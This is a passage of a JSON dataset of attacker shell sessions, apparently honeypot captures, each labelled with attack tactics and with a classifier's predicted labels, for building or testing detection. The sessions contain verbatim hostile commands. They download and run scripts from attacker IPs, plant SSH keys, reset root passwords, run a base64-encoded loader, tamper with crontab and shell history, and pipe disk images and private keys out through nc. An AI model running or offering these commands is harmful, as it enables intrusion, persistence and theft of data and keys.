AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q\/qLn5J+ggJ6um\/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9\/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 >> ~\/.ssh\/authorized_keys <sep> LC_ALL=C netstat -plnt <sep> LC_ALL=C ss -tln <sep> scp -t \/dev\/shm\/md2slmg55yihrge1vwupojbrlw <sep> LC_ALL=C \/dev\/shm\/md2slmg55yihrge1vwupojbrlw <sep> LC_ALL=C rm -f \/dev\/shm\/md2slmg55yihrge1vwupojbrlw <sep> scp -t \/tmp\/md2slmg55yihrge1vwupojbrlw <sep> LC_ALL=C \/tmp\/md2slmg55yihrge1vwupojbrlw <sep> LC_ALL=C rm -f \/tmp\/md2slmg55yihrge1vwupojbrlw <sep> scp -t \/tmp\/knrm <sep> scp -t \/tmp\/r <sep> LC_ALL=C \/tmp\/knrm <sep> LC_ALL=C $SHELL \/tmp\/r <sep> LC_ALL=C \/tmp\/knrm <sep> LC_ALL=C $SHELL \/tmp\/r <sep> LC_ALL=C rm -f \/home\/admin\/.dhpcd <sep> scp -t \/home\/admin\/.dhpcd <sep> LC_ALL=C \/home\/admin\/.dhpcd -o 127.0.0.1:4444 -B > > \/dev\/null \/dev\/null <sep> LC_ALL=C top -bn1 <sep> LC_ALL=C crontab -l <sep> LC_ALL=C chattr -i \/var\/spool\/cron\/crontabs\/root <sep> LC_ALL=C crontab - <sep> LC_ALL=C crontab -l <sep> LC_ALL=C rm -f \/tmp\/r \/tmp\/knrm <sep> ",
+        "labels_expanded":"Discovery - Discovery - Execution - Execution - Defense Evasion - Execution - Execution - Execution - Execution - Execution - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Discovery - Discovery - Execution - Execution - Defense Evasion - Execution - Execution - Defense Evasion - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion",
+        "labels_predicted":"Discovery - Discovery - Execution - Execution - Defense Evasion - Defense Evasion - Defense Evasion - Defense Evasion - Execution - Execution - Discovery - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion - Execution - Defense Evasion - Persistence - Defense Evasion"
+    },
+    {
+        "session":"chmod 0777 \/tmp\/Lindgde4 ;",
+        "labels":"Harmless - 0",
+        "session_expanded":"chmod 0777 \/tmp\/Lindgde4 <sep> ",
+        "labels_expanded":"Harmless",
+        "labels_predicted":"Execution"
+    },
+    {
+        "session":"dd if=\/dev\/sda1 | nc 130.192.95.216 9085 ;",
+        "labels":"Other - 1",
+        "session_expanded":"dd if=\/dev\/sda1 <sep> nc 130.192.95.216 9085 <sep> ",
+        "labels_expanded":"Other - Other",
+        "labels_predicted":"Discovery - Other"
+    },
+    {
+        "session":"unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; unset HISTFILE unset HISTSIZE ; uname -a || cat \/proc\/version ; unset HISTFILE unset HISTSIZE ; uname -a || cat \/proc\/version ; uname -a || cat \/proc\/version ; uname -a || cat \/proc\/version ; uname -a || cat \/proc\/version ; uname -a || cat \/proc\/version ; uname -a || cat \/proc\/version ;",
+        "labels":"Defense Evasion - 1 -- Discovery - 18",
+        "session_expanded":"unset HISTFILE unset HISTSIZE <sep> unset HISTFILE unset HISTSIZE <sep> unset HISTFILE unset HISTSIZE <sep> unset HISTFILE unset HISTSIZE <sep> uname -a <sep> cat \/proc\/version <sep> unset HISTFILE unset HISTSIZE <sep> uname -a <sep> cat \/proc\/version <sep> uname -a <sep> cat \/proc\/version <sep> uname -a <sep> cat \/proc\/version <sep> uname -a <sep> cat \/proc\/version <sep> uname -a <sep> cat \/proc\/version <sep> uname -a <sep> cat \/proc\/version <sep> ",
+        "labels_expanded":"Defense Evasion - Defense Evasion - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Defense Evasion - Defense Evasion - Defense Evasion - Defense Evasion - Discovery - Discovery - Defense Evasion - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"uptime | egrep days | cut -d   -f 4- | awk -F, {print $1} ;",
+        "labels":"Discovery - 3",
+        "session_expanded":"uptime <sep> egrep days <sep> cut -d   -f 4- <sep> awk -F, {print $1} <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"uname -a & lscpu curl -O http:\/\/85.91.64.28\/work\/m ; perl m rm -rf m ;",
+        "labels":"Discovery - 0 -- Execution - 1",
+        "session_expanded":"uname -a & lscpu curl -O http:\/\/85.91.64.28\/work\/m <sep> perl m rm -rf m <sep> ",
+        "labels_expanded":"Discovery - Execution",
+        "labels_predicted":"Discovery - Discovery - Execution - Execution - Defense Evasion"
+    },
+    {
+        "session":"ps -aux ;",
+        "labels":"Discovery - 0",
+        "session_expanded":"ps -aux <sep> ",
+        "labels_expanded":"Discovery",
+        "labels_predicted":"Discovery"
+    },
+    {
+        "session":"scp -t \/tmp\/CaW87HUG ; cd \/tmp && chmod +x CaW87HUG && bash -c .\/CaW87HUG ; .\/CaW87HUG ;",
+        "labels":"Execution - 4",
+        "session_expanded":"scp -t \/tmp\/CaW87HUG <sep> cd \/tmp <sep> chmod +x CaW87HUG <sep> bash -c .\/CaW87HUG <sep> .\/CaW87HUG <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"tags, separated by \" - \".\n\n<labels>Execution - Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"reboot ;",
+        "labels":"Impact - 0",
+        "session_expanded":"reboot <sep> ",
+        "labels_expanded":"Impact",
+        "labels_predicted":"Impact"
+    },
+    {
+        "session":"cd \/tmp || cd \/var\/run || cd \/mnt || cd \/root || cd \/ ; wget http:\/\/1.1.1.1\/bins.sh ; chmod 777 bins.sh ; sh bins.sh ; tftp 1.1.1.1 -c get tftp1.sh ; chmod 777 tftp1.sh ; sh tftp1.sh ; tftp -r tftp2.sh -g 1.1.1.1 ; chmod 777 tftp2.sh ; sh tftp2.sh ; ftpget -v -u anonymous -p anonymous -P 21 1.1.1.1 ftp1.sh ftp1.sh ; sh ftp1.sh ; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh ; rm -rf * ;",
+        "labels":"Execution - 15 -- Defense Evasion - 17",
+        "session_expanded":"cd \/tmp <sep> cd \/var\/run <sep> cd \/mnt <sep> cd \/root <sep> cd \/ <sep> wget http:\/\/1.1.1.1\/bins.sh <sep> chmod 777 bins.sh <sep> sh bins.sh <sep> tftp 1.1.1.1 -c get tftp1.sh <sep> chmod 777 tftp1.sh <sep> sh tftp1.sh <sep> tftp -r tftp2.sh -g 1.1.1.1 <sep> chmod 777 tftp2.sh <sep> sh tftp2.sh <sep> ftpget -v -u anonymous -p anonymous -P 21 1.1.1.1 ftp1.sh ftp1.sh <sep> sh ftp1.sh <sep> rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh <sep> rm -rf * <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion - Defense Evasion",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion - Defense Evasion"
+    },
+    {
+        "session":"rn echo ;",
+        "labels":"Harmless - 0",
+        "session_expanded":"rn echo <sep> ",
+        "labels_expanded":"Harmless",
+        "labels_predicted":"Harmless"
+    },
+    {
+        "session":"mkdir test ;",
+        "labels":"Harmless - 0",
+        "session_expanded":"mkdir test <sep> ",
+        "labels_expanded":"Harmless",
+        "labels_predicted":"Harmless"
+    },
+    {
+        "session":"cat \/proc\/cpuinfo | grep name | wc -l ; echo root:UvFtx2AVC6zN | chpasswd | bash ; echo 321 > \/var\/tmp\/.var03522123 ; rm -rf \/var\/tmp\/.var03522123 ; cat \/var\/tmp\/.var03522123 | head -n 1 ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo root sql!@ > \/tmp\/up.txt ; rm -rf \/var\/tmp\/dota* ; cat \/var\/tmp\/.systemcache436621 ; echo 1 > \/var\/tmp\/.systemcache436621 ; cat \/var\/tmp\/.systemcache436621 ; sleep 15s && cd \/var\/tmp ; echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA= | base64 --decode | bash ;",
+        "labels":"Discovery - 2 -- Persistence - 6 -- Discovery - 35 -- Execution - 40",
+        "session_expanded":"cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo root:UvFtx2AVC6zN <sep> chpasswd <sep> bash <sep> echo 321 > \/var\/tmp\/.var03522123 <sep> rm -rf \/var\/tmp\/.var03522123 <sep> cat \/var\/tmp\/.var03522123 <sep> head -n 1 <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> ls -lh $which ls <sep> which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> echo root sql!@ > \/tmp\/up.txt <sep> rm -rf \/var\/tmp\/dota* <sep> cat \/var\/tmp\/.systemcache436621 <sep> echo 1 > \/var\/tmp\/.systemcache436621 <sep> cat \/var\/tmp\/.systemcache436621 <sep> sleep 15s <sep> cd \/var\/tmp <sep> echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA= <sep> base64 --decode <sep> bash <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"Discovery - Persistence - Discovery - Discovery - Discovery - Execution"
+    },
+    {
+        "session":"wget -P\/tmp http:\/\/122.114.253.125:8080\/m ;",
+        "labels":"Harmless - 0",
+        "session_expanded":"wget -P\/tmp http:\/\/122.114.253.125:8080\/m <sep> ",
+        "labels_expanded":"Harmless",
+        "labels_predicted":"Harmless"
+    },
+    {
+        "session":"cd \/tmp ; wget http:\/\/218.60.67.88:5678\/5050 ;",
+        "labels":"Harmless - 1",
+        "session_expanded":"cd \/tmp <sep> wget http:\/\/218.60.67.88:5678\/5050 <sep> ",
+        "labels_expanded":"Harmless - Harmless",
+        "labels_predicted":"Discovery - Execution"
+    },
+    {
+        "session":"dmesg | grep GSM modem ;",
+        "labels":"Discovery - 1",
+        "session_expanded":"dmesg <sep> grep GSM modem <sep> ",
+        "labels_expanded":"Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery"
+    },
+    {
+        "session":"ls -la \/dev\/ttyGSM* \/var\/spool\/sms\/* \/var\/log\/smsd.log \/etc\/smsd.conf* \/usr\/bin\/qmuxd \/var\/qmux_connect_socket \/etc\/config\/simman \/dev\/modem* ; echo Hi | cat -n ;",
+        "labels":"Discovery - 2",
+        "session_expanded":"ls -la \/dev\/ttyGSM* \/var\/spool\/sms\/* \/var\/log\/smsd.log \/etc\/smsd.conf* \/usr\/bin\/qmuxd \/var\/qmux_connect_socket \/etc\/config\/simman \/dev\/modem* <sep> echo Hi <sep> cat -n <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery",
+        "labels_predicted":"Discovery - Harmless - Harmless"
+    },
+    {
+        "session":"scp -t \/tmp\/SmQjfzYv ; cd \/tmp && chmod +x SmQjfzYv && bash -c .\/SmQjfzYv ; .\/SmQjfzYv ;",
+        "labels":"Execution - 4",
+        "session_expanded":"scp -t \/tmp\/SmQjfzYv <sep> cd \/tmp <sep> chmod +x SmQjfzYv <sep> bash -c .\/SmQjfzYv <sep> .\/SmQjfzYv <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"scp -tr \/usr\/libexec\/ ; C0755 3069524 uihtkx ; \/usr\/bin\/tar Pxvf - ; \/usr\/bin\/tee \/usr\/libexec\/uihtkx > \/dev\/null ; \/usr\/bin\/cat > \/usr\/libexec\/uihtkx ;",
+        "labels":"Execution - 4",
+        "session_expanded":"scp -tr \/usr\/libexec\/ <sep> C0755 3069524 uihtkx <sep> \/usr\/bin\/tar Pxvf - <sep> \/usr\/bin\/tee \/usr\/libexec\/uihtkx > \/dev\/null <sep> \/usr\/bin\/cat > \/usr\/libexec\/uihtkx <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"\/etc\/init.d\/iptables stop ; wget http:\/\/101.37.84.170\/MipsLinux ;",
+        "labels":"Impact - 0 -- Harmless - 1",
+        "session_expanded":"\/etc\/init.d\/iptables stop <sep> wget http:\/\/101.37.84.170\/MipsLinux <sep> ",
+        "labels_expanded":"Impact - Harmless",
+        "labels_predicted":"Impact - Execution"
+    },
+    {
+        "session":"lspci | grep irti ;",
+        "labels":"Discovery - 1",
+        "session_expanded":"lspci <sep> grep irti <sep> ",
+        "labels_expanded":"Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery"
+    },
+    {
+        "session":"\/bin\/sh -c LANG=C; LC_ALL=C; ls -l \/apps\/bin\/tandberg ; LANG=C ; LC_ALL=C ; ls -l \/apps\/bin\/tandberg ; \/bin\/sh -c LANG=C; LC_ALL=C; cat \/etc\/redhat-release ; LANG=C ; LC_ALL=C ; cat \/etc\/redhat-release ;",
+        "labels":"Discovery - 11",
+        "session_expanded":"\/bin\/sh -c LANG=C <sep> LC_ALL=C <sep> ls -l \/apps\/bin\/tandberg <sep> LANG=C <sep> LC_ALL=C <sep> ls -l \/apps\/bin\/tandberg <sep> \/bin\/sh -c LANG=C <sep> LC_ALL=C <sep> cat \/etc\/redhat-release <sep> LANG=C <sep> LC_ALL=C <sep> cat \/etc\/redhat-release <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"show system version ; version ;",
+        "labels":"Discovery - 1",
+        "session_expanded":"show system version <sep> version <sep> ",
+        "labels_expanded":"Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery"
+    },
+    {
+        "session":"cd \/tmp ; wget http:\/\/154.221.26.173:8899\/LinuxTF ; chmod 777 LinuxTF ; .\/LinuxTF ;",
+        "labels":"Execution - 3",
+        "session_expanded":"cd \/tmp <sep> wget http:\/\/154.221.26.173:8899\/LinuxTF <sep> chmod 777 LinuxTF <sep> .\/LinuxTF <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"echo cd \/tmp || cd \/var\/run || cd \/mnt || cd \/root || cd \/ && rm *.sh; wget http:\/\/46.246.63.214\/bin.sh || curl http:\/\/46.246.63.214\/curl.sh -o curl.sh || tftp 46.246.63.214 -c get tftp.sh || tftp -r tftp.sh -g 46.246.63.214 ; chmod +x *.sh ; .\/bin.sh ; .\/curl.sh ; .\/tftp.sh | sh ;",
+        "labels":"Execution - 14",
+        "session_expanded":"echo cd \/tmp <sep> cd \/var\/run <sep> cd \/mnt <sep> cd \/root <sep> cd \/ <sep> rm *.sh <sep> wget http:\/\/46.246.63.214\/bin.sh <sep> curl http:\/\/46.246.63.214\/curl.sh -o curl.sh <sep> tftp 46.246.63.214 -c get tftp.sh <sep> tftp -r tftp.sh -g 46.246.63.214 <sep> chmod +x *.sh <sep> .\/bin.sh <sep> .\/curl.sh <sep> .\/tftp.sh <sep> sh <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution"
+    },
+    {
+        "session":"ls ; curl ident.me ; curl ; curl google.com ; clear ; curl wttr.in ; ps x ; w ; lst ; last ;",
+        "labels":"Discovery - 9",
+        "session_expanded":"ls <sep> curl ident.me <sep> curl <sep> curl google.com <sep> clear <sep> curl wttr.in <sep> ps x <sep> w <sep> lst <sep> last <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery - Discovery - Discovery - Harmless - Discovery - Discovery - Discovery - Harmless - Discovery"
+    },
+    {
+        "session":"cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys && chmod -R go= ~\/.ssh && cd ~ ; cat \/proc\/cpuinfo | grep name | wc -l ; echo -e answernhcspBIJeaqoPnhcspBIJeaqoP | passwd | bash ; Enter new UNIX password: ; echo answernhcspBIJeaqoPnhcspBIJeaqoPn | passwd ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;",
+        "labels":"Persistence - 4 -- Discovery - 8 -- Persistence - 11 -- Harmless - 12 -- Persistence - 14 -- Discovery - 56",
+        "session_expanded":"cd ~ <sep> rm -rf .ssh <sep> mkdir .ssh <sep> echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys <sep> chmod -R go= ~\/.ssh <sep> cd ~ <sep> cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo -e answernhcspBIJeaqoPnhcspBIJeaqoP <sep> passwd <sep> bash <sep> Enter new UNIX password: <sep> echo answernhcspBIJeaqoPnhcspBIJeaqoPn <sep> passwd <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> ls -lh $which ls <sep> which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> which ls <sep> ls -lh $which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> ",
+        "labels_expanded":"Persistence - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Harmless - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Persistence - Persistence - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"sudo hive-passwd 1hj51gh11g4611234ggg12233g4hg4g123 ; sudo pkill Xorg ; sudo pkill x11vnc ; sudo service shellinabox stop ;",
+        "labels":"Persistence - 0 -- Impact - 3",
+        "session_expanded":"sudo hive-passwd 1hj51gh11g4611234ggg12233g4hg4g123 <sep> sudo pkill Xorg <sep> sudo pkill x11vnc <sep> sudo service shellinabox stop <sep> ",
+        "labels_expanded":"Persistence - Impact - Impact - Impact",
+        "labels_predicted":"Persistence - Impact - Impact - Impact"
+    },
+    {
+        "session":"cd \/tmp || cd \/var\/run || cd \/mnt || cd \/root || cd \/ ; wget http:\/\/192.210.191.107\/installer.sh ; chmod 777 installer.sh ; sh installer.sh ; tftp 192.210.191.107 -c get tftp1.sh ; chmod 777 tftp1.sh ; sh tftp1.sh ; tftp -r tftp2.sh -g 192.210.191.107 ; chmod 777 tftp2.sh ; sh tftp2.sh ; rm -rf * ;",
+        "labels":"Execution - 13 -- Defense Evasion - 14",
+        "session_expanded":"cd \/tmp <sep> cd \/var\/run <sep> cd \/mnt <sep> cd \/root <sep> cd \/ <sep> wget http:\/\/192.210.191.107\/installer.sh <sep> chmod 777 installer.sh <sep> sh installer.sh <sep> tftp 192.210.191.107 -c get tftp1.sh <sep> chmod 777 tftp1.sh <sep> sh tftp1.sh <sep> tftp -r tftp2.sh -g 192.210.191.107 <sep> chmod 777 tftp2.sh <sep> sh tftp2.sh <sep> rm -rf * <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion",
+        "labels_predicted":"Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Execution - Defense Evasion"
+    },
+    {
+        "session":"tar cf - \/root\/.ssh\/id_rsa | nc 127.0.0.1 1337 ;",
+        "labels":"Other - 1",
+        "session_expanded":"tar cf - \/root\/.ssh\/id_rsa <sep> nc 127.0.0.1 1337 <sep> ",
+        "labels_expanded":"Other - Other",
+        "labels_predicted":"Discovery - Execution"
+    },
+    {
+        "session":"cat \/proc\/cpuinfo | grep name | wc -l ; echo root:RJOmU4uNN11s | chpasswd | bash ; echo 321 > \/var\/tmp\/.var03522123 ; rm -rf \/var\/tmp\/.var03522123 ; cat \/var\/tmp\/.var03522123 | head -n 1 ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo root japan > \/tmp\/up.txt ; rm -rf \/var\/tmp\/dota* ; cat \/var\/tmp\/.systemcache436621 ; echo 1 > \/var\/tmp\/.systemcache436621 ; cat \/var\/tmp\/.systemcache436621 ; sleep 15s && cd \/var\/tmp ; echo 